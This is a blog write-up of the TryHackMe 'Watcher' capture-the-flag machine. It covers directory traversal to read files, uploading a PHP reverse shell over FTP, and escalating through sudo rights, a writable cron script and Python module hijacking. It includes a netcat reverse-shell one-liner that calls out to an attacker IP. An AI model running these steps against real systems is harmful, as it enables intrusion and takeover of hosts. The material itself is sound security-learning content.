---
title: "Watcher - TryHackMe Writeup"
date: 2024-01-19
draft: false
summary: "Writeup for Watcher CTF challenge on TryHackMe."
tags: ["linux", "lfi", "sudo", "cron", "hardcoded creds"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/watcher/cover.webp"
  caption: "Watcher TryHackMe Challenge"
  alt: "Watcher cover"
platform: "TryHackMe"
author: "Moiz Bootwala"
---

A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/watcher

## Reconnaissance

I performed an **nmap** aggressive scan to find open ports and information related to them. This revealed 3 services - FTP, SSH and HTTP

```shell
nmap -A -p- TARGET --min-rate 10000 -oN watcher.nmap
```

![performing an nmap scan on watcher challenge](https://cdn.ziomsec.com/watcher/1.webp)

## Initial Foothold

I looked for vulnerabilities related to the **Jekyll** version found through the **nmap** scan and found that the version running on the target allowed arbitrary file access.

![searching for jekyll vulnerabilities](https://cdn.ziomsec.com/watcher/2.webp)

I then fuzzed for hidden files using **ffuf** and found the *robots.txt* file which could contain interesting endpoints.

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -fc 403
```

![finding hidden files using ffuf](https://cdn.ziomsec.com/watcher/3.webp)

### Capturing Flag 1

I accessed the file and found an endpoint leading to the first flag.

![accessing robots.txt](https://cdn.ziomsec.com/watcher/4.webp)

![capturing the first flag](https://cdn.ziomsec.com/watcher/5.webp)

The *robots.txt* file contained another endpoint called `secret_file_do_not_read.txt` so I tried accessing it but was restricted by a `403 Forbidden` error. 

I then explored the web application and noticed the url pointed to a PHP file.

![exploring the web application](https://cdn.ziomsec.com/watcher/6.webp)

I captured and forwarded the request to **Burp**'s **Repeater** to further test it. Since early reconnaissance revealed a file read vulnerability, I attempted to traverse the directory to access the `/etc/passwd` file - and succeeded.

![reading the /etc/passwd file](https://cdn.ziomsec.com/watcher/7.webp)

By exploiting the above vulnerability, I read the secret endpoint mentioned in the *robots.txt* file. It revealed the FTP credentials and the path where the uploaded files would be saved.

![finding fpt creds](https://cdn.ziomsec.com/watcher/8.webp)

### Capturing Flag 2

I used the credentials to access the FTP server and found the second flag. 

![accessing the ftp server](https://cdn.ziomsec.com/watcher/9.webp)

![capturing the second flag](https://cdn.ziomsec.com/watcher/10.webp)

### Shell As `www-data`

I then configured and uploaded **pentestmonkey**'s **php-reverse-shell** to the *files* directory on the FTP server.

```shell
cd files
put revshell.php
```

![uploading a reverse shell payload](https://cdn.ziomsec.com/watcher/11.webp)

I then started a **netcat** listener and accessed the reverse shell through directory traversal to get shell access.

![triggering the payload](https://cdn.ziomsec.com/watcher/12.webp)

```shell
rlwrap nc -lnvp PORT
```

I also spawned a pty shell

```shell
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![getting a reverse shell](https://cdn.ziomsec.com/watcher/13.webp)

## Privilege Escalation

I examined the user directories to determine the sequence in which I had to laterally pivot from one user to another. However, none of them contained the third flag. Which meant that the third flag was likely accessible by my current user (*www-data*).

![finding user info](https://cdn.ziomsec.com/watcher/14.webp)

### Capturing flag 3

As the service account, I started looking into the directories I had access to and found an interesting folder called `more_secrets_a9f10a` inside the `html` folder that wasn't visible on the web. Inside it, I found the third flag.

```shell
cat /var/www/html/more_secrets_a9f10a/flag_3.txt
```

![capturing the third flag](https://cdn.ziomsec.com/watcher/15.webp)

### Capturing Flag 4 & Gaining Shell As `toby`

I now had to get access as *toby* to capture the fourth flag. So, I went into his directory for clues but found nothing related to my goal. I then checked my sudo privileges and found that I was allowed to run all commands as *toby* without a password. 

So, I executed **`/bin/bash`** as *toby*. 

```shell
sudo -l
sudo -u toby /bin/bash
```

![gaining access as toby](https://cdn.ziomsec.com/watcher/16.webp)

I then captured the fourth flag.

```shell
cat /home/toby/flag_4.txt
```

![capturing the fourth flag](https://cdn.ziomsec.com/watcher/17.webp)

### Capturing Flag 5 & Gaining Shell As `mat`

After *toby*, I had to pwn *Mat* for the fifth flag. Apart from the flag, *toby* also had a note and *jobs* directory which contained a bash script. The note hinted towards a cron job being executed as mat.

![viewing the bash script](https://cdn.ziomsec.com/watcher/18.webp)

The crontab confirmed the cron job. The script present inside the *jobs* directory would be executed every minute.

```shell
cat /etc/crontab
```

![inspecting cron jobs](https://cdn.ziomsec.com/watcher/19.webp)

Since I was the owner of the script, I had full access over it. So, I added a simple reverse shell payload and started a **netcat** listener on a separate tab.

```shell
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.10 9001 >/tmp/f' >> cow.sh
```

![adding a reverse shell payload to be executed by cron](https://cdn.ziomsec.com/watcher/20.webp)

After some time, I got a reverse shell as *mat*.

![getting a reverse shell as mat](https://cdn.ziomsec.com/watcher/21.webp)

I then captured the fifth flag.

```shell
cat /home/mat/flag_5.txt
```

![capturing the fifth flag](https://cdn.ziomsec.com/watcher/22.webp)

### Capturing Flag 6 & Gaining Shell As `will`

*mat* also had a note and a *scripts* directory with 2 **python** files. *Mat* was allowed to run a python script as *will*.

```shell
sudo -l
```

![listing sudo privs](https://cdn.ziomsec.com/watcher/23.webp)

The *cmd.py* module was being imported and used in the second script that was owned by *will*. Hence, any changes made to the *cmd.py* file would also affect *will*'s script.

![reading the python scripts](https://cdn.ziomsec.com/watcher/24.webp)

Hence, I added a python reverse shell in *cmd.py* and ran *will_script.py* as the user *Will*. I started a reverse shell and upon execution, received a reverse shell.

```shell
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *
```

![adding a python reverse shell payload](https://cdn.ziomsec.com/watcher/25.webp)

The `id` command revealed something interesting. *Will* was a part of the **adm** group which meant I could read logs and backups.

![inspecting groups](https://cdn.ziomsec.com/watcher/26.webp)

Before further enumeration, I captured the sixth flag.

```shell
cat /home/will/flag_6.txt
```

![capturing the sixth flag](https://cdn.ziomsec.com/watcher/27.webp)

### Capturing Flag 7 & Gaining Shell As `root`

I then enumerated logs and backups and found a **base64** encoded text file inside the */opt/backups* folder.

```shell
cat /opt/backups/key.b64
```

![reading the encoded file](https://cdn.ziomsec.com/watcher/28.webp)

Decoding it revealed it to be an SSH private key.

```shell
ssh -d key.b64
```

![decoding the file](https://cdn.ziomsec.com/watcher/29.webp)

Since it was a private key, it required restricted permissions, so I saved the decoded key and fixed its permissions. I was then able to log in as *root* using it.

```shell
base64 -d key.b64 > priv.key
chmod 600 priv.key
ssh root@TARGET -i priv.key
```

![fixing the permissions of ssh private key](https://cdn.ziomsec.com/watcher/30.webp)

Finally, I captured the seventh flag from the */root* directory.

```shel
cat /root/flag_7.txt
```

![capturing the root flag](https://cdn.ziomsec.com/watcher/31.webp)

That's it from my side!
Happy hacking :)

---